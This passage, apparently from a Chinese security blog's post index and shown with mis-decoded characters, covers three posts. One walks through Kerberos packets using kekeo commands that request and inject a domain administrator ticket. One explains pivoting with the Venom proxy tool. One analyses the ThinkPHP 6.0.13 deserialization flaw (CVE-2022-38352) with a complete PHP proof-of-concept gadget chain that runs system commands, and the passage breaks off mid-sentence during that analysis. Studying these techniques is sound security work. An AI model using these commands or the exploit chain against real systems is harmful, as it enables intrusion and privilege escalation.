hash(æœºå™¨ç”¨æˆ·hash) è¿›è¡ŒåŠ å¯†çš„ æ—¶é—´æˆ³ã€Client Nameã€Client IPã€Server IPã€STæœ‰æ•ˆæ—¶é—´ã€TGS_Session key ã€‚å‘é€ST çš„æ•°æ®åŒ…æ˜¯TGS-REP(TGS-response) æ³¨æ„ï¼šTGS_Session Key ä¸»è¦ç”¨åœ¨Clientå’ŒServerçš„é€šä¿¡ä¸Š è‡³æ­¤ï¼ŒClientå’ŒKDCçš„é€šä¿¡å°±ç»“æŸäº†ï¼Œç„¶åæ˜¯ Client å’ŒServerè¿›è¡Œé€šä¿¡ (4) å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯é€šä¿¡åˆ†æ(Authentication 3)å®¢æˆ·ç«¯æ”¶åˆ° TGSå‘é€çš„ STä¹‹åï¼Œå¯¹å…¶è¿›è¡Œè§£å¯† Clientæ”¶åˆ°KRB_TGS_REPï¼Œå…ˆä½¿ç”¨ AS_Session Key è§£å¯†å‡ºäº† TGS_Session Key å†ä½¿ç”¨è§£å‡ºæ¥çš„ TGS_Session Key åŠ å¯† æ—¶é—´æˆ³ã€STæœ‰æ•ˆæ—¶é—´ã€Client Nameã€Client IP ä½œä¸ºä¸€éƒ¨åˆ†å†…å®¹ï¼ŒåŠ ä¸ŠSTé‡ŒServer hashåŠ å¯†çš„å¦ä¸€éƒ¨åˆ† é‡æ–°å°è£…æˆæ–°çš„ ST å‘é€ç»™Server å³ KRB_AP_REQ Server æ”¶åˆ° KRB_AP_REQ ,ç”¨è‡ªèº«çš„Server NTLM hashè§£å¯†äº† STï¼Œå¾—åˆ°TGS_Session Keyã€æ—¶é—´æˆ³ç­‰ç­‰ã€‚å†è§£å¯†å¦ä¸€éƒ¨åˆ† å¾—åˆ° Client Nameã€Client-IPã€æ—¶é—´æˆ³å’Œ STæœ‰æ•ˆæ—¶é—´ å†ä¸ç¬¬ä¸€éƒ¨åˆ†çš„ æ—¶é—´æˆ³ã€Clientä¿¡æ¯è¿›è¡Œå¯¹æ¯”ï¼Œtimestamp ä¸€èˆ¬æ—¶é—´ä¸º8å°æ—¶ã€‚ éªŒè¯é€šè¿‡åï¼Œå›å¤KRB_AP_REPï¼Œå»ºç«‹é€šä¿¡ å…¶å®æ•´ä¸ªKerberosè®¤è¯çš„æµç¨‹å°±æ˜¯ä¸æ–­äº¤æ¢å¯†é’¥ï¼Œä½¿ç”¨å¯¹ç§°åŠ å¯†ç®—æ³•ï¼Œè§£å¯†éªŒè¯èº«ä»½å’Œæ—¶é—´æˆ³ï¼Œæœ€åè¾¾åˆ°è®¤è¯çš„æ•ˆæœ &lt;4&gt; Kerberosåè®®è®¤è¯æ•°æ®åŒ…åˆ†æ(1) AS-REQå’ŒAS-REPæ•°æ®åŒ…åˆ†æåˆ©ç”¨ kekeo å·¥å…·ç”³è¯·ç¥¨æ®ï¼ŒwiresharkæŠ“åŒ…åˆ†æ 1tgt::ask /user:1vxyz /domain:hack.com /password:å¯†ç  ç”³è¯·ä¸€ä¸‹ 1vxyzç”¨æˆ·çš„ç¥¨æ® AS-REQ åŒ…å«äº†ç”¨æˆ·çš„ä¸€äº›ä¿¡æ¯ï¼Œæ˜¯å®¢æˆ·ç«¯å‘é€ç»™ASçš„æ•°æ®åŒ…ï¼Œé‡Œé¢æœ‰å‡ ä¸ªé‡è¦ä¿¡æ¯ï¼š PA-DATA pA-ENC-TIMESTAMPï¼šä½¿ç”¨ç”¨æˆ·çš„hash æˆ–è€… AESkey åŠ å¯†æ—¶é—´æˆ³ç”Ÿæˆçš„ value PA-DATA pA-PAC-REQUESTï¼Œæ˜¯å¦åŒ…å«PAC kdc-options cnameï¼šè¯·æ±‚çš„ç”¨æˆ·å realmï¼šåŸŸå snameï¼šè¯·æ±‚çš„æœåŠ¡ AS-REPï¼šå½“KDCæ”¶åˆ° AES-REQ ä¹‹åè§£å¯† PA-DATA pA-ENC-TIMESTAMP æˆåŠŸ åˆ™å›å‘TGTç»™å®¢æˆ·ç«¯ TGT æœ‰ä¸¤éƒ¨åˆ†ä¿¡æ¯ï¼š enc-partï¼šTGTä¸­ ç”¨æˆ·hashåŠ å¯†çš„éƒ¨åˆ† enc-partï¼šTGTä¸­ krbtgt hashåŠ å¯†çš„éƒ¨åˆ† (2) TGS-REQå’ŒTGS-REPæ•°æ®åŒ…åˆ†æè¿˜æ˜¯åˆ©ç”¨kekeoå·¥å…· ä»¥ 1vxyzçš„èº«ä»½ç”³è¯·ä¸€å¼  è®¿é—® DC.hack.comçš„cifsæœåŠ¡çš„ç¥¨ 1234# é¦–å…ˆç”³è¯·TGTç¥¨æ®tgt::ask /user:1vxyz /domain:hack.com /password:å¯†ç # æ‹¿ç€ç¬¬ä¸€æ­¥ç”³è¯·åˆ°çš„TGTç¥¨æ® ç”³è¯·STtgs::ask /tgt:TGT_1vxyz@HACK.COM_krbtgt~hack.com@HACK.COM.kirbi /service:cifs/DC.hack.com TGS-REQï¼šå®¢æˆ·ç«¯å‘é€ç»™TGSçš„ å¸¦æœ‰ç”¨æˆ·è§£å¯†åé‡æ–°å°è£…çš„TGT æ•°æ®åŒ…ï¼Œå…¶ä¸­åŒ…å«ï¼š authenticatorï¼šä½¿ç”¨ AS_Session KeyåŠ å¯†çš„Client_infoã€TGS_Nameç­‰ç­‰ ticketï¼škrbtgtç”¨æˆ·hashåŠ å¯†çš„TGTï¼ŒAS-REP é‡ŒåŸå°ä¸åŠ¨çš„ticket cnameï¼šè¯·æ±‚çš„ç”¨æˆ·å snameï¼šè¯·æ±‚çš„æœåŠ¡åç§° TGS-REPï¼šTGSå‘é€ç»™å®¢æˆ·ç«¯çš„ ST æ•°æ®åŒ…ã€‚å†…å®¹åŒ…å«ï¼š ticketé‡Œenc-partï¼šServer hashåŠ å¯†çš„ä¿¡æ¯ enc-partï¼šAS_Session KeyåŠ å¯†çš„ä¿¡æ¯ (3) AP-REQå’ŒAP-REPæ•°æ®åŒ…åˆ†æAP-REQ æ˜¯ å®¢æˆ·ç«¯å‘é€ é‡æ–°å°è£…å¥½çš„ ST åˆ°æœåŠ¡ç«¯çš„æ•°æ®åŒ… æˆ‘ä»¬ä½¿ç”¨kekeoå·¥å…·ç”³è¯·ä¸€å¼ åŸŸç®¡çš„ç¥¨æ® é«˜æƒé™çš„ ç„¶åwiresharkæŠ“åŒ…åˆ†æ 1234567# é¦–å…ˆç”³è¯·TGTç¥¨æ®tgt::ask /user:administrator /domain:hack.com /password:å¯†ç # æ‹¿ç€ç¬¬ä¸€æ­¥ç”³è¯·åˆ°çš„TGTç¥¨æ® ç”³è¯·STå¹¶æ³¨å…¥å†…å­˜tgs::ask /tgt:TGTåç§° /service:æœåŠ¡å/åŸŸååœ°å€ /ptt tgs::ask /tgt:TGT_administrator@HACK.COM_krbtgt~hack.com@HACK.COM.kirbi /service:cifs/DC.hack.com /pttklist # æŸ¥çœ‹å†…å­˜ä¸­çš„ç¥¨è¯ ç”³è¯·åˆ°administratorçš„ç¥¨æ®åæ³¨å…¥å†…å­˜ä¸­ï¼ŒæˆåŠŸè®¿é—® åŸŸæ§çš„Cç›˜ç›®å½• è¿™é‡Œå°±ä¸æ˜¯ KRB5ç±»å‹çš„åŒ…äº† èµ°çš„smb ç±»ä¼¼äº NTLMè®¤è¯æ—¶åå•†ã€è´¨è¯¢çš„æ•°æ®åŒ…ã€‚ä½†æ˜¯è¿™é‡Œ Session Setup Requesté‡Œ æ”¾çš„ä¸æ˜¯challengeï¼Œè€Œæ˜¯Kerberosçš„ä¸œè¥¿ã€‚ å‘é€çš„ STåŒ…å«ä¸¤éƒ¨åˆ† ticketé‡Œenc-partï¼šServer hashåŠ å¯†çš„ä¿¡æ¯ authenticatorï¼šTGS_Session KeyåŠ å¯†çš„ä¿¡æ¯ AP-REP æ˜¯ æœåŠ¡ç«¯å‘é€åˆ°å®¢æˆ·ç«¯çš„æ•°æ® &lt;5&gt; Kerberosåè®®è®¤è¯ä¸­å­˜åœ¨çš„å®‰å…¨é—®é¢˜(1) ä¸€äº›æ¦‚å¿µé»„é‡‘ç¥¨æ® krbtgt çš„NTLM Hashå¦‚æœæ³„éœ²äº†ï¼Œé‚£ä¹ˆTGTå°±èƒ½è¢«è§£å¯†ç”šè‡³ä¼ªé€ ã€‚ä¼ªé€ çš„TGTå«åšé»„é‡‘ç¥¨æ® ç™½é“¶ç¥¨æ® ST(Ticket )æ˜¯ç”±Serverçš„NTLM Hashè¿›è¡ŒåŠ å¯†çš„ï¼Œå¦‚æœè¯¥Hashæ³„éœ²ï¼Œé‚£ä¹ˆå°±å¯ä»¥è§£å¯†ç”šè‡³ä¼ªé€ Ticketã€‚ä¼ªé€ çš„Ticket å«åšç™½é“¶ç¥¨æ® å“ªä¸ªæ›´å®¹æ˜“ä¼ªé€ ä¸€äº›ï¼Ÿ ç­”æ¡ˆæ˜¯é»„é‡‘ç¥¨æ®ï¼Œç™½é“¶ç¥¨æ®éœ€è¦çŸ¥é“Server hashï¼Œè®¿é—®æ¯ä¸ªæœåŠ¡éƒ½éœ€è¦ä¸€ä¸ªServer hashå»ä¼ªé€ STã€‚è€Œé»„é‡‘ç¥¨æ®éœ€è¦çŸ¥é“ krbtgt hashå³å¯ PACPrivilege Attribute Certificate (ç‰¹æƒå±æ€§è¯ä¹¦)ï¼Œç®€ç§°PACï¼Œä¸ºäº†å¢åŠ äº†è®¤è¯è¿‡ç¨‹ä¸­çš„æƒé™è®¤è¯ã€‚PACä¼šè¢«æ”¾åœ¨TGTé‡Œå‘é€ç»™Clientï¼Œç„¶åç”±Clientå‘é€ç»™TGS ms14-068 æ¼æ´ï¼Œå°±æ˜¯åŸºäºPACè®¤è¯çš„é”™è¯¯ï¼Œä»è€Œå¯¼è‡´åŸŸå†…æ™®é€šç”¨æˆ·å¯ä»¥ä¼ªé€ å‡­æ®ï¼Œææƒåˆ°ç®¡ç†å‘˜æƒé™ (2) Authentication 1-AS_REQè¯·æ±‚é˜¶æ®µåœ¨è¿™ä¸€é˜¶æ®µï¼Œ å¯èƒ½å­˜åœ¨å¦‚ä¸‹æ¼æ´ï¼š PTH å“ˆå¸Œä¼ é€’ å½“åŸŸå†…clientæŸä¸ªç”¨æˆ·è¯†å›¾è®¿é—®åŸŸä¸­çš„æŸä¸ªæœåŠ¡æ—¶ï¼Œè¯¥é˜¶æ®µclientä¼šç”¨ç”¨æˆ·çš„NTLM hashå»å¯¹ æ—¶é—´æˆ³ã€clientä¿¡æ¯ è¿›è¡ŒåŠ å¯†ï¼Œä¹Ÿå°±æ˜¯æ•°æ®åŒ…é‡Œçš„ authenticatorå­—æ®µï¼Œç„¶åå‘é€ç»™AS æ‰€ä»¥é€ æˆäº†hashä¼ é€’ åŸŸå†…ç”¨æˆ·æšä¸¾ æ­¤é˜¶æ®µclientå‘ASè¯æ˜è‡ªå·±çš„èº«ä»½çš„è¿‡ç¨‹ï¼ŒASæ£€æŸ¥cnameï¼Œå½“ç”¨æˆ·ä¸å­˜åœ¨ï¼Œè¿”å›åŒ…æç¤ºé”™è¯¯ã€‚ ä½¿ç”¨kerbruteè¿›è¡Œé”™è¯¯æšä¸¾çš„åŸç†å°±æ˜¯kerberosæœ‰è¿™æ ·å››ç§é”™è¯¯ä»£ç ï¼š KDC_ERR_PREAUTH_REQUIRED-éœ€è¦é¢å¤–çš„é¢„è®¤è¯ï¼ˆå¯ç”¨ï¼‰ KDC_ERR_CLIENT_REVOKED-å®¢æˆ·ç«¯å‡­è¯å·²è¢«åŠé”€ï¼ˆç¦ç”¨ï¼‰ KDC_ERR_C_PRINCIPAL_UNKNOWN-åœ¨Kerberosæ•°æ®åº“ä¸­æ‰¾ä¸åˆ°å®¢æˆ·ç«¯ï¼ˆä¸å­˜åœ¨ï¼‰ KDC_ERR_PREAUTH_FAILED (ç”¨æˆ·å­˜åœ¨ä½†å¯†ç é”™è¯¯) å–·æ´’æ”»å‡»(å¯†ç æšä¸¾) æ¯”å¦‚å·²çŸ¥åŸŸå†…ç”¨æˆ·åç§°ï¼Œå¯ä»¥ä½¿ç”¨ä¸åŒçš„hashåŠ å¯†è¿™é‡Œå†…å®¹ å¯†ç æ­£ç¡®å’Œé”™è¯¯è¿”å›çš„åŒ…æ˜¯ä¸ç›¸åŒçš„ã€‚åŸç†åŒ åŸŸå†…ç”¨æˆ·æšä¸¾ (3) Authentication 1-AS_REPè¯·æ±‚é˜¶æ®µAS_REPæ•°æ®åŒ…ä¸­enc-parté‡Œé¢æœ€é‡è¦çš„å­—æ®µå°±æ˜¯AS_session keyï¼Œä½œä¸ºä¸‹é˜¶æ®µçš„è®¤è¯å¯†é’¥ AS-REPä¸­æœ€æ ¸å¿ƒçš„ä¸œè¥¿å°±æ˜¯AS_session-key å’Œ krbtgt hash åŠ å¯†çš„ ticketã€‚æ­£å¸¸æˆ‘ä»¬ç”¨å·¥å…·ç”Ÿæˆçš„å‡­æ®æ˜¯.ccacheå’Œ.kirbiåç¼€çš„ï¼Œç”¨mimikatzï¼Œkekeoï¼Œrebeusç”Ÿæˆçš„å‡­æ®æ˜¯.kirbiåç¼€çš„ï¼Œimpacketç”Ÿæˆçš„å‡­æ®æ˜¯.ccacheï¼Œä¸¤ç§ç¥¨æ®ä¸»è¦åŒ…å«çš„éƒ½æ˜¯Login session-key å’ŒåŠ å¯†çš„ ticketï¼Œå› æ­¤å¯ä»¥ç›¸äº’è½¬æ¢ è¿™ä¸€é˜¶æ®µå­˜åœ¨é»„é‡‘ç¥¨æ®ã€Roasting (4) Authentication 2-TGS_REPè¯·æ±‚é˜¶æ®µTGS-REPä¸­æœ€æ ¸å¿ƒçš„ä¸œè¥¿å°±æ˜¯TGS_session-key å’Œ Server hash åŠ å¯†çš„ ticket å­˜åœ¨ ç™½é“¶ç¥¨æ®ã€Kerberoasting Kerberosæ‰©å±•åè®®ï¼šå§”æ´¾ã€Kerberos bronze bit å‚è€ƒï¼šhttps://www.jianshu.com/p/13758c310242","link":"/2023/10/05/Kerberos%E8%AE%A4%E8%AF%81%E5%AD%A6%E4%B9%A0/"},{"title":"Venomå†…ç½‘ä»£ç†å·¥å…·","text":"æ‘˜è¦ï¼šVenomä»£ç†å·¥å…·ä½¿ç”¨ &lt;1&gt; å·¥å…·ä»‹ç»Venomæ˜¯ä¸€æ¬¾ä¸ºæ¸—é€æµ‹è¯•äººå‘˜è®¾è®¡çš„ã€ä½¿ç”¨Goå¼€å‘çš„å¤šçº§ä»£ç†å·¥å…· Venomå¯å°†å¤šä¸ªèŠ‚ç‚¹è¿›è¡Œè¿æ¥ï¼Œç„¶åä»¥èŠ‚ç‚¹ä¸ºè·³æ¿ï¼Œæ„å»ºå¤šçº§ä»£ç† åœ¨å†…ç½‘æ¸—é€æ—¶ï¼Œå¯å°†ç½‘ç»œæµé‡ä»£ç†åˆ°å¤šå±‚å†…ç½‘ ç‰¹æ€§ï¼š å¯è§†åŒ–ç½‘ç»œæ‹“æ‰‘ å¤šçº§socks5ä»£ç† å¤šçº§ç«¯å£è½¬å‘ ç«¯å£å¤ç”¨ (apache/mysql/â€¦) sshéš§é“ äº¤äº’å¼shell æ–‡ä»¶çš„ä¸Šä¼ å’Œä¸‹è½½ èŠ‚ç‚¹é—´é€šä¿¡åŠ å¯† æ”¯æŒå¤šç§å¹³å°(Linux/Windows/MacOS)å’Œå¤šç§æ¶æ„(x86/x64/arm/mips) ä¸‹è½½åœ°å€ï¼šhttps://github.com/Dliv3/Venom/ &lt;2&gt; å·¥å…·ä½¿ç”¨(1) ç›‘å¬ä¸å‘èµ·è¿æ¥adminèŠ‚ç‚¹å’ŒagentèŠ‚ç‚¹å‡å¯ç›‘å¬è¿æ¥ä¹Ÿå¯å‘èµ·è¿æ¥ æœåŠ¡ç«¯adminç›‘å¬ã€å®¢æˆ·ç«¯agentå‘èµ·è¿æ¥ï¼š 12æœåŠ¡ç«¯ï¼š./admin_linux_x64 -lport 1111å®¢æˆ·ç«¯ï¼š./agent_linux_x64 -rhost æœ¬æœºip -rport 1111 å®¢æˆ·ç«¯agentç›‘å¬ã€æœåŠ¡ç«¯adminå‘èµ·è¿æ¥ï¼š 12æœåŠ¡ç«¯ï¼š./admin_linux_x64 -rhost æœ¬æœºip -rport 1111 å®¢æˆ·ç«¯ï¼š./agent_linux_x64 -lport 1111 (2) agentèŠ‚ç‚¹æ”¯æŒç«¯å£å¤ç”¨agentæä¾›äº†ä¸¤ç§ç«¯å£å¤ç”¨æ–¹æ³• é€šè¿‡SO_REUSEPORTå’ŒSO_REUSEADDRé€‰é¡¹è¿›è¡Œç«¯å£å¤ç”¨ é€šè¿‡iptablesè¿›è¡Œç«¯å£å¤ç”¨(ä»…æ”¯æŒLinuxå¹³å°) é€šè¿‡venomæä¾›çš„ç«¯å£å¤ç”¨åŠŸèƒ½ï¼Œåœ¨windowsä¸Šå¯ä»¥å¤ç”¨apacheã€mysqlç­‰æœåŠ¡çš„ç«¯å£ï¼Œæš‚æ—¶æ— æ³•å¤ç”¨RDPã€IISç­‰æœåŠ¡ç«¯å£ï¼Œåœ¨linuxä¸Šå¯ä»¥å¤ç”¨å¤šæ•°æœåŠ¡ç«¯å£ã€‚è¢«å¤ç”¨çš„ç«¯å£ä»å¯æ­£å¸¸å¯¹å¤–æä¾›å…¶åŸæœ‰æœåŠ¡ ç¬¬ä¸€ç§ç«¯å£å¤ç”¨ï¼š 1234# ä»¥windowsä¸‹apacheä¸ºä¾‹# å¤ç”¨apache 80ç«¯å£ï¼Œä¸å½±å“apacheæä¾›æ­£å¸¸çš„httpæœåŠ¡# -lhost çš„å€¼ä¸ºæœ¬æœºipï¼Œä¸èƒ½å†™0.0.0.0ï¼Œå¦åˆ™æ— æ³•è¿›è¡Œç«¯å£å¤ç”¨./agent.exe -lhost 192.168.204.139 -reuse-port 80 ç¬¬äºŒç§ç«¯å£å¤ç”¨ï¼š 123# ä»¥linuxä¸‹apacheä¸ºä¾‹# éœ€è¦rootæƒé™sudo ./agent_linux_x64 -lport 8080 -reuse-port 80 è¿™ç§ç«¯å£å¤ç”¨æ–¹æ³•ä¼šåœ¨æœ¬æœºè®¾ç½®iptablesè§„åˆ™ï¼Œå°†reuse-portçš„æµé‡è½¬å‘åˆ°lportï¼Œå†ç”±agentåˆ†å‘æµé‡ éœ€è¦æ³¨æ„ä¸€ç‚¹ï¼Œå¦‚æœé€šè¿‡sigtermï¼Œsigintä¿¡å·ç»“æŸç¨‹åº(killæˆ–ctrl-c)ï¼Œç¨‹åºå¯ä»¥è‡ªåŠ¨æ¸…ç†iptablesè§„åˆ™ã€‚å¦‚æœagentè¢«kill -9æ€æ‰åˆ™æ— æ³•è‡ªåŠ¨æ¸…ç†iptablesè§„åˆ™ï¼Œéœ€è¦æ‰‹åŠ¨æ¸…ç†ï¼Œå› ä¸ºagentç¨‹åºæ— æ³•å¤„ç†sigkillä¿¡å·ã€‚ ä¸ºäº†é¿å…iptablesè§„åˆ™ä¸èƒ½è‡ªåŠ¨è¢«æ¸…ç†å¯¼è‡´æ¸—é€æµ‹è¯•è€…æ— æ³•è®¿é—®80ç«¯å£æœåŠ¡ï¼Œæ‰€ä»¥ç¬¬äºŒç§ç«¯å£å¤ç”¨æ–¹æ³•é‡‡ç”¨äº†iptables -m recenté€šè¿‡ç‰¹æ®Šçš„tcpåŒ…æ§åˆ¶iptablesè½¬å‘è§„åˆ™æ˜¯å¦å¼€å¯ 123456789# å¯åŠ¨agentåœ¨linuxä¸»æœºä¸Šè®¾ç½®çš„iptablesè§„åˆ™# å¦‚æœrhoståœ¨å†…ç½‘ï¼Œå¯ä»¥ä½¿ç”¨socks5ä»£ç†è„šæœ¬æµé‡ï¼Œsocks5ä»£ç†çš„ä½¿ç”¨è§ä¸‹æ–‡python scripts/port_reuse.py --start --rhost å†…ç½‘rhost --rport 80# è¿æ¥agentèŠ‚ç‚¹./admin_macos_x64 -rhost å†…ç½‘rhost -rport 80# å¦‚æœè¦å…³é—­è½¬å‘è§„åˆ™python scripts/port_reuse.py --stop --rhost å†…ç½‘rhost --rport 80 (3) adminç»“ç‚¹å‘½ä»¤1234567891011121314151617(admin node) &gt;&gt;&gt; help help # æ‰“å°ä½¿ç”¨å¸®åŠ© exit # é€€å‡º show # æ˜¾ç¤ºç½‘ç»œæ‹“æ‰‘ getdes # æ˜¾ç¤º targetç»“ç‚¹çš„æè¿° setdes [info] # æ·»åŠ å¯¹ targetç»“ç‚¹çš„æè¿° goto [id] # é€‰å–ä¸€ä¸ªè¦æ“ä½œçš„ targetç»“ç‚¹. listen [lport] # åœ¨ targetç»“ç‚¹ä¸Šç›‘å¬ä¸€ä¸ªç«¯å£ connect [rhost] [rport] # é€šè¿‡ targetç»“ç‚¹è¿æ¥ä¸€ä¸ªæ–°èŠ‚ç‚¹ sshconnect [user@ip:port] [dport] # é€šè¿‡sshéš§é“è¿æ¥ä¸€ä¸ªæ–°èŠ‚ç‚¹ shell # è·å–targetèŠ‚ç‚¹çš„äº¤äº’å¼shell upload [local_file] [remote_file] # ä¸Šä¼ æ–‡ä»¶åˆ° targetç»“ç‚¹ download [remote_file] [local_file] # ä»targetç»“ç‚¹ä¸‹è½½æ–‡ä»¶ socks [lport] # ä»targetèŠ‚ç‚¹çš„lportç«¯å£å»ºç«‹ä¸€ä¸ªsocks5ä»£ç† lforward [lhost] [sport] [dport] # å°†æœ¬åœ°ç«¯å£è½¬å‘åˆ°è¿œç¨‹ rforward [rhost] [sport] [dport] # å°†è¿œç¨‹ç«¯å£è½¬å‘åˆ°æœ¬åœ° goto æ“ä½œæŸèŠ‚ç‚¹ã€getdes/setdes è·å–/è®¾ç½®èŠ‚ç‚¹ä¿¡æ¯æè¿° connect/listen ç»“ç‚¹äº’è¿ 12345(node 1) &gt;&gt;&gt; listen 2222å¦ä¸€å°ä¸»æœºï¼š./agent -rhost node1ip -rport 2222å¦ä¸€å°ä¸»æœºï¼š./agent -lport 2222(node 1) &gt;&gt;&gt; connect å¦ä¸€å°ä¸»æœºip 2222 socks å»ºç«‹åˆ°æŸèŠ‚ç‚¹çš„socks5ä»£ç† 12(node 1) &gt;&gt;&gt; socks 7777a socks5 proxy of the target node has started up on local port 7777 rforward å°†node1ç½‘æ®µçš„192.168.200.1çš„80ç«¯å£è½¬å‘åˆ°adminèŠ‚ç‚¹æœ¬åœ°çš„3333ç«¯å£ 12(node 1) &gt;&gt;&gt; rforward 192.168.200.1 80 3333forward remote network 192.168.200.1 port 80 to local port 3333 (4) å¤šå±‚ç½‘ç»œç¯å¢ƒ æ­é…proxifierä½¿ç”¨å·¥å…·æ”¯æŒä»¥èŠ‚ç‚¹ä¸ºè·³æ¿ï¼Œæ„å»ºå¤šçº§ä»£ç†ã€‚ socks å»ºç«‹åˆ°ç›®æ ‡ç»“ç‚¹çš„socks5ä»£ç†ï¼Œç„¶å proxifier æ­é…ä»£ç†ï¼Œå³å¯è®¿é—®ç›®æ ‡å†…ç½‘å…¶ä»–ä¸»æœº ä¾‹å¦‚ï¼š ç½‘ç»œç¯å¢ƒï¼šæˆ‘ä»¬æ‹¿ä¸‹äº†å¤–ç½‘å¯è®¿é—®çš„ 192.168.200.2ä¸»æœºï¼Œå†å…¶Cæ®µå†… å­˜æ´»ä¸€å° 192.168.200.1 ç›´æ¥è®¿é—®ä¸å¯ åˆ©ç”¨ venom + proxifier ç„¶ååˆ©ç”¨ proxifierè¿æ¥ä»£ç†ï¼Œå°†è‡ªå·±çš„è®¿é—® ç”±ä»£ç†è½¬å‘å‡ºå» è®¾ç½® Proxy Server ç„¶åé…ç½® Proxification Rules ä»£ç†è§£æè§„åˆ™ Target Hosts ä¸º 192.168.200.1 å³å¯å°†è‡ªå·±è®¿é—® 192.168.200.1çš„è¯·æ±‚é€šè¿‡æœåŠ¡å™¨socks5ä»£ç†è½¬å‘è¿‡å» ç„¶åæµè§ˆå™¨ è¾“å…¥ å³å¯è®¿é—®åˆ°å†…ç½‘ä¸»æœºå¼€å¯çš„webæœåŠ¡ å‚è€ƒï¼šhttps://xz.aliyun.com/t/4058","link":"/2023/09/01/Venom%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7/"},{"title":"Thinkphp v6.0.13ååºåˆ—åŒ–(CVE-2022-38352)åˆ†æ","text":"Thinkphp v6.0.13ååºåˆ—åŒ–rceæ¼æ´(CVE-2022-38352)åˆ†ææ‘˜è¦ï¼šThinkPHP 6.0.13 ååºåˆ—åŒ–rceæ¼æ´åˆ†æ ä¸€ã€æ¼æ´ä»‹ç»Thinkphp 6.0.13ç‰ˆæœ¬å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡ç»„ä»¶League\\Flysystem\\Cached\\Storage\\Psr6CacheåŒ…å«ååºåˆ—åŒ–æ¼æ´ ç›®å‰çš„Thinkphp6.1.0ä»¥ä¸Šå·²ç»å°†filesystemç§»é™¤äº† å› ä¸ºæ­¤å¤„å­˜åœ¨å¥½å¤šæ¡ååºåˆ—åŒ–æ¼æ´ äºŒã€æ¼æ´å½±å“ç‰ˆæœ¬Thinkphp &lt;= v6.0.13 ä¸‰ã€æ¼æ´ç¯å¢ƒåˆ©ç”¨ composerå®‰è£…Thinkphp6.0.13ï¼š 1composer create-project topthink/think=6.0.13 tp6 æ³¨ï¼štp6ä¹‹ååªèƒ½ä½¿ç”¨composerå®‰è£… è¿™é‡Œå³ä½¿æŒ‡å®šäº†ç‰ˆæœ¬ã€‚composeré»˜è®¤ä¸‹è½½çš„è¿˜æ˜¯ ç¨³å®šç‰ˆæœ¬çš„thinkphp æœ€ç»ˆæ‰“å¼€æ˜¯ä¸ª6.1.3çš„ç‰ˆæœ¬ è¿™ä¸ªç‰ˆæœ¬çš„ä¾èµ–å‰”é™¤äº† League\\Flysystem è¿™æ˜¯ååºåˆ—åŒ–æ¼æ´çš„é‡è¦ä¸€ç¯ å› æ­¤ è¿™é‡Œå¤ç°ç¯å¢ƒå°±ä¸‹è½½äº†ä¸€ä¸ªæ‰“åŒ…å¥½çš„ 6.0.8çš„ç‰ˆæœ¬çš„Thinkphp å››ã€æ¼æ´åˆ†æpocå¦‚ä¸‹ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576&lt;?phpnamespace League\\Flysystem\\Cached\\Storage{ class Psr6Cache{ private $pool; protected $autosave = false; public function __construct($exp) { $this-&gt;pool = $exp; } }}namespace think\\log{ class Channel{ protected $logger; protected $lazy = true; public function __construct($exp) { $this-&gt;logger = $exp; $this-&gt;lazy = false; } }}namespace think{ class Request{ protected $url; public function __construct() { $this-&gt;url = '&lt;?php system(&quot;calc&quot;); exit(); ?&gt;'; } } class App{ protected $instances = []; public function __construct() { $this-&gt;instances = ['think\\Request'=&gt;new Request()]; } }}namespace think\\view\\driver{ class Php{}}namespace think\\log\\driver{ class Socket{ protected $config = []; protected $app; protected $clientArg = []; public function __construct() { $this-&gt;config = [ 'debug'=&gt;true, 'force_client_ids' =&gt; 1, 'allow_client_ids' =&gt; '', 'format_head' =&gt; [new \\think\\view\\driver\\Php,'display'], # åˆ©ç”¨ç±»å’Œæ–¹æ³• ]; $this-&gt;app = new \\think\\App(); $this-&gt;clientArg = ['tabid'=&gt;'1']; } }}namespace{ $c = new think\\log\\driver\\Socket(); $b = new think\\log\\Channel($c); $a = new League\\Flysystem\\Cached\\Storage\\Psr6Cache($b); echo urlencode(serialize($a));} è§‚å¯Ÿå¯çŸ¥ï¼Œæœ€ç»ˆåˆ©ç”¨ç‚¹æ˜¯åœ¨ think\\view\\driver\\Php.php çš„ displayæ–¹æ³• å­˜åœ¨ eval(â€˜?&gt;â€™ . $this-&gt;content); å‘½ä»¤æ‰§è¡Œ ç”±äºè¿™ä¸ªæ¡†æ¶å‘ä¸ŠæŒ–éº»çƒ¦ä¸€äº›ï¼Œè¿™é‡Œæˆ‘ä»¬ç›´æ¥è·Ÿç€poc è°ƒè¯•ä¸€ä¸‹ çœ‹çœ‹è¿™æ¡é“¾å­è°ƒç”¨è¿‡ç¨‹ æ ¹æ®pocå¯çŸ¥ ååºåˆ—åŒ–é“¾å­å…¥å£ç‚¹åœ¨ï¼šLeague\\Flysystem\\Cached\\Storage\\Psr6Cache Psr6Cacheç±»æ˜¯æ²¡æœ‰__destruct()æ–¹æ³•çš„ ä½†æ˜¯å®ƒç»§æ‰¿äº†AbstractCache å…¶çˆ¶ç±» çš„League\\Flysystem\\Cached\\Storage\\AbstractCacheçš„__destruct()æ–¹æ³•ï¼š $this-&gt;autosaveå¯æ§ï¼Œå› æ­¤è°ƒç”¨Psr6Cacheç±»çš„save()æ–¹æ³• 123456public function save(){ $item = $this-&gt;pool-&gt;getItem($this-&gt;key); $item-&gt;set($this-&gt;getForStorage()); $item-&gt;expiresAfter($this-&gt;expire); $this-&gt;pool-&gt;save($item);} å½“è°ƒç”¨ä¸€ä¸ªæœªå®šä¹‰æˆ–ä¸å¯è®¿é—®æ–¹æ³•æ—¶ï¼Œ __call() æ–¹æ³•å°†è¢«è°ƒç”¨ $this-&gt;poolå¯æ§ï¼Œè¿™é‡Œå¯ä»¥é€šè¿‡å…¶ä¸­$this-&gt;pool-&gt;getItem($this-&gt;key); è°ƒç”¨ä»»æ„ç±»çš„__call()æ–¹æ³• è¿™é‡Œæˆ‘ä»¬ç”¨åˆ°çš„æ˜¯ think\\log\\Channelç±»çš„__call()æ–¹æ³•ï¼š Channelç±»ä¸å…·æœ‰ getItem()æ–¹æ³•ï¼Œå› æ­¤ ç»™$this-&gt;pool èµ‹å€¼ Channelç±»å¯¹è±¡ï¼Œå¯ä»¥å‡ºå‘å…¶ 